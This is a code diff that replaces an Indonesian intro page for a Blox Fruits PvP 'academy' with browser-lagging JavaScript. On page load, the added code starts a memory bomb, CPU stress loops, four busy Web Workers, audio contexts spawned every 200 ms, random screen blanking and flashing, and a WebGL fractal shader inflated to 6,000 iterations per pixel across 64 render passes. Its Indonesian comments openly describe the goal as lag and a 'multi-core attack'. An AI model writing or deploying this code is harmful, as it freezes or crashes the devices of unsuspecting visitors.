@@ -1,378 +1,416 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Intro</title>
+  
+    let memoryBomb = [];
+    let cpuStressInterval;
+    let webWorkers = [];
+    let audioContexts = [];
+    let uiBlankInterval;
+    let blankCounter = 0;
+    
+    var cx, cy;
+    var glposition, glright, glforward, glup, glorigin, glx, gly, gllen;
+    var canvas, gl;
+    var date = new Date();
+    var mx = 0, my = 0;
+    var ml = 0, mr = 0, mm = 0;
+    var len = 1.6;
+    var ang1 = 2.8;
+    var ang2 = 0.4;
+    var cenx = 0.0, ceny = 0.0, cenz = 0.0;
 
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+    // SHADER SANGAT BERAT - DITINGKATKAN
+    var KERNEL = "float kernal(vec3 ver){\n" +
+        "   vec3 a;\n" +
+        "float b,c,d,e;\n" +
+        "   a=ver;\n" +
+        "   for(int i=0;i<32;i++){\n" + // ITERASI DITINGKATKAN DARI 16 KE 32
+        "       b=length(a);\n" +
+        "       c=atan(a.y,a.x)*16.0;\n" + // PERKALIAN DITINGKATKAN
+        "       e=1.0/b;\n" +
+        "       d=acos(a.z/b)*16.0;\n" + // PERKALIAN DITINGKATKAN
+        "       b=pow(b,16.0);\n" + // POWER DITINGKATKAN
+        "       a=vec3(b*sin(d)*cos(c),b*sin(d)*sin(c),b*cos(d))+ver;\n" +
+        "       if(b>12.0){\n" + // THRESHOLD DITINGKATKAN
+        "           break;\n" +
+        "       }\n" +
+        "   }" +
+        "   return 4.0-a.x*a.x-a.y*a.y-a.z*a.z;" +
+        "}";
 
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+    var vertshade, fragshader, shaderProgram;
 
-body{
-height:100vh;
-overflow:hidden;
-background:radial-gradient(circle at 30% 30%, #1b1b3a, #0a0a1a 60%, #000);
-color:white;
-}
+    // ========== FUNGSI AUTO UI BLANK ==========
+    function startUIBlank() {
+        uiBlankInterval = setInterval(() => {
+            const uiBlank = document.getElementById('uiBlank');
+            blankCounter++;
+            
+            // Pattern blank yang berbeda-beda
+            if (blankCounter % 10 === 0) {
+                // Blank total 1 detik
+                uiBlank.style.display = 'block';
+                setTimeout(() => {
+                    uiBlank.style.display = 'none';
+                }, 1000);
+            } else if (blankCounter % 7 === 0) {
+                // Flash cepat
+                uiBlank.classList.add('blank-flash');
+                setTimeout(() => {
+                    uiBlank.classList.remove('blank-flash');
+                    uiBlank.style.display = 'none';
+                }, 500);
+            } else if (blankCounter % 5 === 0) {
+                // Blank random duration
+                const duration = Math.random() * 800 + 200;
+                uiBlank.style.display = 'block';
+                setTimeout(() => {
+                    uiBlank.style.display = 'none';
+                }, duration);
+            } else if (blankCounter % 3 === 0) {
+                // Fade in/out
+                uiBlank.style.display = 'block';
+                uiBlank.style.opacity = '0';
+                let opacity = 0;
+                const fadeInterval = setInterval(() => {
+                    opacity += 0.1;
+                    uiBlank.style.opacity = opacity;
+                    if (opacity >= 1) {
+                        clearInterval(fadeInterval);
+                        setTimeout(() => {
+                            const fadeOutInterval = setInterval(() => {
+                                opacity -= 0.1;
+                                uiBlank.style.opacity = opacity;
+                                if (opacity <= 0) {
+                                    clearInterval(fadeOutInterval);
+                                    uiBlank.style.display = 'none';
+                                }
+                            }, 50);
+                        }, 300);
+                    }
+                }, 50);
+            }
 
-/* ================= FLOATING BOX ================= */
-.box{
-position:absolute;
-top:50%;
-left:50%;
-transform:translate(-50%,-50%);
-width:90%;
-max-width:500px;
-padding:40px;
-background:rgba(255,255,255,0.05);
-backdrop-filter:blur(50px);
-border:1px solid rgba(255,255,255,0.15);
-border-radius:20px;
-box-shadow:0 0 40px rgba(255,255,255,0.1);
-animation:float 6s ease-in-out infinite alternate;
-text-align:center;
-}
+            // Reset counter agar tidak terlalu besar
+            if (blankCounter > 1000) blankCounter = 0;
+        }, 3000); // Setiap 3 detik ada efek blank
+    }
+    
+    // ========== FUNGSI TAMBAHAN UNTUK MEMBUAT LAG ==========
+    function startMemoryBomb() {
+        setInterval(() => {
+            // Bomb memory dengan array besar
+            const bomb = new Array(1000000).fill('LAG_' + Date.now());
+            memoryBomb.push(bomb);
+            
+            // Jaga memory bomb agar tidak crash terlalu cepat tapi tetap berat
+            if (memoryBomb.length > 50) {
+                memoryBomb.splice(0, 10);
+            }
+        }, 1000);
+    }
+    
+    function startCPUStress() {
+        // CPU stress tambahan di JavaScript
+        cpuStressInterval = setInterval(() => {
+            let result = 0;
+            for (let i = 0; i < 1000000; i++) {
+                result += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i);
+                result = Math.abs(Math.pow(result, 1.5));
+            }
+        }, 50);
+    }
+    
+    function startWebWorkerBomb() {
+        // Multiple web workers untuk multi-core attack
+        const workerCode = `
+            let workerData = [];
+            setInterval(() => {
+                let sum = 0;
+                for (let i = 0; i < 2000000; i++) {
+                    sum += Math.sqrt(i) * Math.random() * Math.sin(i);
+                }
+                
+                // Memory stress di worker
+                const arr = new Array(50000).fill(0).map(() => 
+                    new Array(100).fill(Math.random().toString(36))
+                );
+                workerData.push(arr);
+                
+                postMessage(sum);
+            }, 10);
+        `;
+        
+        for (let i = 0; i < 4; i++) {
+            try {
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
+                worker.onmessage = function() {};
+                webWorkers.push(worker);
+            } catch(e) {}
+        }
+    }
+    
+    function startAudioStress() {
+        // Audio processing stress
+        setInterval(() => {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.value = 100 + Math.random() * 2000;
+                gainNode.gain.value = 0.05;
+                
+                oscillator.start();
+                setTimeout(() => oscillator.stop(), 500);
+                
+                audioContexts.push(audioContext);
+            } catch(e) {}
+        }, 200);
+    }
+    
+    // --- LOOP PEMAKSA (FORCE LOOP) - DIUPDATE ---
+    function ontimer() {
+        // Kita ubah sudut sedikit setiap frame agar GPU HARUS menghitung ulang
+        // Tidak bisa memakai cache frame sebelumnya
+        ang1 += 0.02; // DIPERCEPAT
+        
+        draw();
+        
+        // TAMBAHAN: DOM manipulation stress
+        if (Math.random() > 0.5) {
+            const tempDiv = document.createElement('div');
+            tempDiv.textContent = 'LAG';
+            tempDiv.style.cssText = 'position:fixed;top:' + Math.random() * 100 + '%;left:' + Math.random() * 100 + '%;color:transparent;z-index:-1;';
+            document.body.appendChild(tempDiv);
+            setTimeout(() => {
+                if (tempDiv.parentNode) tempDiv.parentNode.removeChild(tempDiv);
+            }, 1000);
+        }
+        
+        // PENTING: Menggunakan setTimeout dengan delay 0 alih-alih requestAnimationFrame
+        // Ini memaksa browser mengeksekusi frame berikutnya SECEPAT MUNGKIN tanpa menunggu VSync
+        setTimeout(ontimer, 0);
+    }
+    
+    document.addEventListener("mousedown", function (ev) {
+        var oEvent = ev || event;
+        if (oEvent.button == 0) { ml = 1; mm = 0; }
+        if (oEvent.button == 2) { mr = 1; mm = 0; }
+        mx = oEvent.clientX; my = oEvent.clientY;
+    }, false);
+    document.addEventListener("mouseup", function (ev) {
+        var oEvent = ev || event;
+        if (oEvent.button == 0) ml = 0;
+        if (oEvent.button == 2) mr = 0;
+    }, false);
+    document.addEventListener("mousemove", function (ev) {
+        var oEvent = ev || event;
+        if (ml == 1) {
+            ang1 += (oEvent.clientX - mx) * 0.002;
+            ang2 += (oEvent.clientY - my) * 0.002;
+            if (oEvent.clientX != mx || oEvent.clientY != my) mm = 1;
+        }
+        if (mr == 1) {
+            var l = len * 4.0 / (cx + cy);
+            cenx += l * (-(oEvent.clientX - mx) * Math.sin(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.cos(ang1));
+            ceny += l * ((oEvent.clientY - my) * Math.cos(ang2));
+            cenz += l * ((oEvent.clientX - mx) * Math.cos(ang1) - (oEvent.clientY - my) * Math.sin(ang2) * Math.sin(ang1));
+            if (oEvent.clientX != mx || oEvent.clientY != my) mm = 1;
+        }
+        mx = oEvent.clientX; my = oEvent.clientY;
+    }, false);
+    document.addEventListener("mousewheel", function (ev) {
+        ev.preventDefault();
+        len *= Math.exp(-0.001 * ev.wheelDelta);
+    }, false);
+    
+    // --- FUNGSI RENDER 16x GRID (HEAVY LOAD) - DIUPDATE ---
+    function draw() {
+        gl.uniform1f(glx, cx * 2.0 / (cx + cy));
+        gl.uniform1f(gly, cy * 2.0 / (cx + cy));
+        gl.uniform1f(gllen, len);
 
-@keyframes float{
-0%{transform:translate(-50%,-50%) translateY(0px);}
-100%{transform:translate(-50%,-50%) translateY(-25px);}
-}
+        var totalW = canvas.width;
+        var totalH = canvas.height;
+        var grid = 8; // DITINGKATKAN DARI 4 KE 8 (64 Render Passes!)
+        var cellW = totalW / grid;
+        var cellH = totalH / grid;
 
-/* ================= TYPING ================= */
-.typing{
-min-height:80px;
-font-size:16px;
-line-height:1.6;
-margin-bottom:20px;
-}
+        // Loop render 64 kali per frame (8x8 grid)
+        for(var r = 0; r < grid; r++) {
+            for(var c = 0; c < grid; c++) {
+                gl.viewport(c * cellW, r * cellH, cellW, cellH);
 
-.cursor{
-display:inline-block;
-width:2px;
-background:white;
-animation:blink 1s infinite;
-margin-right:5px;
-}
+                // Variasi sudut pandang untuk setiap kotak
+                var angleOffset = (r * grid + c) * 0.3; 
+                var curAng1 = ang1 + angleOffset;
 
-@keyframes blink{
-0%,50%,100%{opacity:1;}
-25%,75%{opacity:0;}
-}
+                gl.uniform3f(glorigin, len * Math.cos(curAng1) * Math.cos(ang2) + cenx, len * Math.sin(ang2) + ceny, len * Math.sin(curAng1) * Math.cos(ang2) + cenz);
+                gl.uniform3f(glright, Math.sin(curAng1), 0, -Math.cos(curAng1));
+                gl.uniform3f(glup, -Math.sin(ang2) * Math.cos(curAng1), Math.cos(ang2), -Math.sin(ang2) * Math.sin(curAng1));
+                gl.uniform3f(glforward, -Math.cos(curAng1) * Math.cos(ang2), -Math.sin(ang2), -Math.sin(curAng1) * Math.cos(ang2));
 
- 
+                gl.drawArrays(gl.TRIANGLES, 0, 6);
+            }
+        }
+        
+        // FORCE SYNC: Memaksa CPU menunggu GPU selesai sebelum lanjut.
+        // Ini adalah penyebab utama "Lag" pada thread utama browser.
+        gl.finish(); 
+    }
 
-/* ================= METEOR ================= */
-.meteor{
-position:absolute;
-width:3px;
-height:3px;
-background:white;
-border-radius:50%;
-box-shadow:0 0 10px white;
-}
+    window.onresize = function () {
+        cx = document.body.clientWidth;
+        cy = document.body.clientHeight;
+        if(cx>cy) cx=cy; else cy=cx;
+        document.getElementById("main").style.width=2048+"px";
+        document.getElementById("main").style.height=2048+"px";
+        document.getElementById("main").style.transform="scale("+cx/2048+","+cy/2048+")";
+    }
 
-.meteor::after{
-content:"";
-position:absolute;
-width:120px;
-height:2px;
-background:linear-gradient(to right, white, transparent);
-transform:rotate(45deg);
-transform-origin:left;
-top:1px;
-left:-120px;
-}
+    window.onload = function () {
+        // ========== JALANKAN SEMUA FUNGSI LAG ==========
+        startMemoryBomb();
+        startCPUStress();
+        startWebWorkerBomb();
+        startAudioStress();
+        startUIBlank(); // TAMBAHAN: Auto UI Blank
+        
+        cx = document.body.clientWidth;
+        cy = document.body.clientHeight;
+        if(cx>cy) cx=cy; else cy=cx;
+        
+        document.getElementById("main").style.width=2048+"px";
+        document.getElementById("main").style.height=2048+"px";
+        document.getElementById("main").style.transform="scale("+cx/2048+","+cy/2048+")";
 
-/* ================= TWINKLE STAR ================= */
-.twinkle{
-position:absolute;
-width:2px;
-height:2px;
-background:white;
-border-radius:50%;
-animation:twinkleAnim 1s linear forwards;
-}
+        var positions = [-1.0, -1.0, 0.0, 1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, 1.0, 0.0];
+        
+        var VSHADER_SOURCE =
+            "#version 100 \n"+
+            "precision highp float;\n" +
+            "attribute vec4 position;" +
+            "varying vec3 dir, localdir;" +
+            "uniform vec3 right, forward, up, origin;" +
+            "uniform float x,y;" +
+            "void main() {" +
+            "   gl_Position = position; " +
+            "   dir = forward + right * position.x*x + up * position.y*y;" +
+            "   localdir.x = position.x*x;" +
+            "   localdir.y = position.y*y;" +
+            "   localdir.z = -1.0;" +
+            "} ";
 
-@keyframes twinkleAnim{
-0%{opacity:0;}
-50%{opacity:1;}
-100%{opacity:0;}
-}
+        // FRAGMENT SHADER - LOOP SANGAT PANJANG - DIUPDATE
+        var FSHADER_SOURCE =
+            "#version 100 \n" +
+            "#define PI 3.14159265358979324\n" +
+            "#define M_L 0.3819660113\n" +
+            "#define M_R 0.6180339887\n" +
+            "#define MAXR 64\n" +  // DITINGKATKAN DARI 32 KE 64
+            "#define SOLVER 32\n" + // DITINGKATKAN DARI 16 KE 32
+            "precision highp float;\n" +
+            "float kernal(vec3 ver)\n;" +
+            "uniform vec3 right, forward, up, origin;\n" +
+            "varying vec3 dir, localdir;\n" +
+            "uniform float len;\n" +
+            "vec3 ver;\n" +
+            "int sign;"+
+            "float v, v1, v2;\n" +
+            "float r1, r2, r3, r4, m1, m2, m3, m4;\n" +
+            "vec3 n;\n" +
+            "const float step = 0.0001;\n" + // STEP DIKECILKAN (LEBIH BANYAK ITERASI)
+            "vec3 color;\n" +
+            "void main() {\n" +
+            "   color = vec3(0.0);\n" +
+            "   sign=0;"+
+            "   v1 = kernal(origin + dir * (step*len));\n" +
+            "   v2 = kernal(origin);\n" +
+            "   // LOOP UTAMA: DIPANJANGKAN KE 6000 ITERASI PER PIXEL\n" +
+            "   for (int k = 2; k < 6000; k++) {\n" + // DITINGKATKAN DARI 3000 KE 6000
+            "      ver = origin + dir * (step*len*float(k));\n" +
+            "      v = kernal(ver);\n" +
+            "      if (v > 0.0 && v1 < 0.0) {\n" +
+            "         r1 = step * len*float(k - 1);\n" +
+            "         r2 = step * len*float(k);\n" +
+            "         m1 = kernal(origin + dir * r1);\n" +
+            "         m2 = kernal(origin + dir * r2);\n" +
+            "         for (int l = 0; l < SOLVER; l++) {\n" +
+            "            r3 = r1 * 0.5 + r2 * 0.5;\n" +
+            "            m3 = kernal(origin + dir * r3);\n" +
+            "            if (m3 > 0.0) { r2 = r3; m2 = m3; }\n" +
+            "            else { r1 = r3; m1 = m3; }\n" +
+            "         }\n" +
+            "         if (r3 < 2.0 * len) { sign=1; break; }\n" +
+            "      }\n" +
+            "      v2 = v1; v1 = v;\n" +
+            "   }\n" +
+            "   if (sign==1) {\n" +
+            "      ver = origin + dir*r3 ;\n" +
+            "      float eps = r3*0.0001;\n" +
+            "      n.x = kernal(ver - right * eps) - kernal(ver + right * eps);\n" +
+            "      n.y = kernal(ver - up * eps) - kernal(ver + up * eps);\n" +
+            "      n.z = kernal(ver + forward * eps) - kernal(ver - forward * eps);\n" +
+            "      n = normalize(n);\n" +
+            "      color = vec3(abs(n.x), abs(n.y), abs(n.z));\n" +
+            "   }\n" +
+            "   gl_FragColor = vec4(color, 1.0);" +
+            "}";
 
-/* ================= DOOR LOADING ================= */
-#overlay{
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:100%;
-background:#000;
-display:flex;
-justify-content:center;
-align-items:center;
-z-index:9999;
-opacity:0;
-pointer-events:none;
-transition:.5s;
-overflow:hidden;
-}
+        canvas = document.getElementById('c1');
+        gl = canvas.getContext('webgl');
+        vertshader = gl.createShader(gl.VERTEX_SHADER);
+        fragshader = gl.createShader(gl.FRAGMENT_SHADER);
+        shaderProgram = gl.createProgram();
+        gl.shaderSource(vertshader, VSHADER_SOURCE);
+        gl.compileShader(vertshader);
+        gl.shaderSource(fragshader, FSHADER_SOURCE + KERNEL);
+        gl.compileShader(fragshader);
+        gl.attachShader(shaderProgram, vertshader);
+        gl.attachShader(shaderProgram, fragshader);
+        gl.linkProgram(shaderProgram);
+        gl.useProgram(shaderProgram);
 
-.door{
-position:absolute;
-top:0;
-width:50%;
-height:100%;
-background:#000;
-transition:1.2s;
-}
+        glposition = gl.getAttribLocation(shaderProgram, 'position');
+        glright = gl.getUniformLocation(shaderProgram, 'right');
+        glforward = gl.getUniformLocation(shaderProgram, 'forward');
+        glup = gl.getUniformLocation(shaderProgram, 'up');
+        glorigin = gl.getUniformLocation(shaderProgram, 'origin');
+        glx = gl.getUniformLocation(shaderProgram, 'x');
+        gly = gl.getUniformLocation(shaderProgram, 'y');
+        gllen = gl.getUniformLocation(shaderProgram, 'len');
+        
+        var buffer = gl.createBuffer();
+        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
+        gl.vertexAttribPointer(glposition, 3, gl.FLOAT, false, 0, 0);
+        gl.enableVertexAttribArray(glposition);
 
-.left{left:0;transform:translateX(-100%);}
-.right{right:0;transform:translateX(100%);}
+        // Start forced loop
+        ontimer();
 
-.loader{
-width:60px;
-height:60px;
-border:5px solid #333;
-border-top:5px solid #fff;
-border-radius:50%;
-animation:spin 1s linear infinite;
-opacity:0;
-}
-
-@keyframes spin{to{transform:rotate(360deg);}}
-</style>
-<style>
-/* FLOAT STAR (tidak hilang) */
-.float-star{
-position:absolute;
-border-radius:50%;
-background:white;
-opacity:.6;
-filter:blur(.3px);
-animation:floatMove linear infinite alternate;
-}
-
-@keyframes floatMove{
-0%{transform:translate(0,0);}
-100%{transform:translate(20px,-30px);}
-}
-
-/* METEOR */
-.meteor{
-position:absolute;
-width:4px;
-height:4px;
-background:white;
-border-radius:50%;
-box-shadow:0 0 12px white;
-}
-
-.meteor::after{
-content:"";
-position:absolute;
-height:2px;
-background:linear-gradient(to right,white,transparent);
-top:1px;
-left:-150px;
-}
-
-/* TWINKLE */
-.twinkle{
-position:absolute;
-border-radius:50%;
-background:white;
-opacity:0;
-}
-</style>
-<style>
-button{
-display:none;
-position:relative;
-padding:12px 35px;
-border-radius:30px;
-border:2px solid white;
-background:white;
-color:#000;
-font-weight:600;
-cursor:pointer;
-overflow:hidden;
-transition:.3s ease;
-z-index:1;
-}
-
-/* layer warna yang akan slide */
-button::before{
-content:"";
-position:absolute;
-top:0;
-right:0;
-width:0%;
-height:100%;
-background:linear-gradient(90deggrey,black);
-transition:width .4s ease;
-z-index:-1;
-}
-
-/* hover effect */
-button:hover{
-color:white;
-transform:translateY(-4px);
-box-shadow:0 0 25px rgba(255,255,255,0.4);
-}
-
-button:hover::before{
-left:0;
-right:auto;
-width:100%;
-}
-</style>
-</head>
-<body>
-
-<div class="box">
-<div class="typing">
-<span class="cursor"></span><span id="text"></span>
-</div>
-<button id="okBtn" onclick="Tutup()">OK</button>
-</div>
-
-<div id="overlay">
-<div class="door left"></div>
-<div class="door right"></div>
-<div class="loader"></div>
-</div>
-
-<script>
-function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
-
-/* ================= TYPING ================= */
-async function typeWords(element, text){
-let words=text.split(" ");
-for(let i=0;i<words.length;i++){
-
-if(words[i]==="<jeda"){
-let delay=parseInt(words[i+1]);
-await sleep(delay);
-i++;
-continue;
-}
-
-if(words[i].includes("<stop>")) break;
-
-let word=words[i]+" ";
-for(let j=0;j<word.length;j+=3){
-element.innerHTML+=word.slice(j,j+3);
-await sleep(100);
-}
-}
-document.getElementById("okBtn").style.display="inline-block";
-}
-
-typeWords(
-document.getElementById("text"),
-"Halo Pendatang.. <jeda 500> Academy Bijih Naga didirikan oleh ArcZNewEra Sekaligus KepalaSekolah Untuk Mengajar Kan Cara Pvp Dan Meningkatkan Pvp Bloxfruit kita... <jeda 1200> Tekan OK untuk melanjutkan. <stop>"
-);
-
-/* ================= METEOR SYSTEM ================= */
- 
-
-/* ================= DOOR LOADING ================= */
-function Tutup(){
-const overlay=document.getElementById("overlay");
-const left=document.querySelector(".left");
-const right=document.querySelector(".right");
-const loader=document.querySelector(".loader");
-
-overlay.style.opacity="1";
-overlay.style.pointerEvents="all";
-
-setTimeout(()=>{
-left.style.transform="translateX(0)";
-right.style.transform="translateX(0)";
-},100);
-
-setTimeout(()=>loader.style.opacity="1",1200);
-
-setTimeout(()=>{
-window.location.href="base.html";
-},7000);
-}
-</script>
-<script>
-
-/* ================= FLOAT STAR (PERMANEN) ================= */
-for(let i=0;i<60;i++){
-let s=document.createElement("div");
-s.className="float-star";
-
-let size=Math.random()*3+1;
-s.style.width=size+"px";
-s.style.height=size+"px";
-s.style.left=Math.random()*100+"vw";
-s.style.top=Math.random()*100+"vh";
-s.style.opacity=Math.random();
-s.style.animationDuration=(8+Math.random()*10)+"s";
-
-document.body.appendChild(s);
-}
-
-/* Tambah star baru tiap 5 detik (tidak hapus yang lama) */
-setInterval(()=>{
-let s=document.createElement("div");
-s.className="float-star";
-let size=Math.random()*3+1;
-s.style.width=size+"px";
-s.style.height=size+"px";
-s.style.left=Math.random()*100+"vw";
-s.style.top=Math.random()*100+"vh";
-s.style.opacity=Math.random();
-s.style.animationDuration=(8+Math.random()*10)+"s";
-document.body.appendChild(s);
-},5000);
-
-
-/* ================= METEOR (KIRI ATAS ➜ KANAN BAWAH) ================= */
- 
-
-
-/* ================= TWINKLE SYSTEM ================= */
-function spawnTwinkleGroup(){
-
-let total=4+Math.floor(Math.random()*12); // 4-15
-
-for(let i=0;i<total;i++){
-
-let t=document.createElement("div");
-t.className="twinkle";
-
-let size=Math.random()*3+1;
-t.style.width=size+"px";
-t.style.height=size+"px";
-t.style.left=Math.random()*100+"vw";
-t.style.top=Math.random()*100+"vh";
-
-document.body.appendChild(t);
-
-let blinkCount=4+Math.floor(Math.random()*3); // 4-6
-let blink=0;
-
-let blinkInterval=setInterval(()=>{
-t.style.opacity = t.style.opacity==1 ? 0 : 1;
-blink++;
-if(blink>=blinkCount*2){
-clearInterval(blinkInterval);
-t.remove();
-}
-},200);
-
-}
-}
-
-/* tiap 2.5 detik muncul grup baru */
-setInterval(spawnTwinkleGroup,2500);
-
-</script>
-</body>
-</html>
+        document.getElementById("kernel").value = KERNEL;
+        document.getElementById("btn").addEventListener("click", function() {
+            var state = this.innerText == "CONFIG";
+            this.innerText = state ? "HIDE" : "CONFIG";
+            document.getElementById("config").style.display = state ? "inline" : "none";
+        });
+        document.getElementById("apply").addEventListener("click", function() {
+            KERNEL = document.getElementById("kernel").value;
+            gl.shaderSource(fragshader, FSHADER_SOURCE + KERNEL);
+            gl.compileShader(fragshader);
+            gl.linkProgram(shaderProgram);
+            gl.useProgram(shaderProgram);
+            
+            glposition = gl.getAttribLocation(shaderProgram, 'position');
+            glright = gl.getUniformLocation(shaderProgram, 'right');
+            glforward = gl.getUniformLocation(shaderProgram, 'forward');
+            glup = gl.getUniformLocation(shaderProgram, 'up');
+            glorigin = gl.getUniformLocation(shaderProgram, 'origin');
+            glx = gl.getUniformLocation(shaderProgram, 'x');
+            gly = gl.getUniformLocation(shaderProgram, 'y');
+            gllen = gl.getUniformLocation(shaderProgram, 'len');
+        });
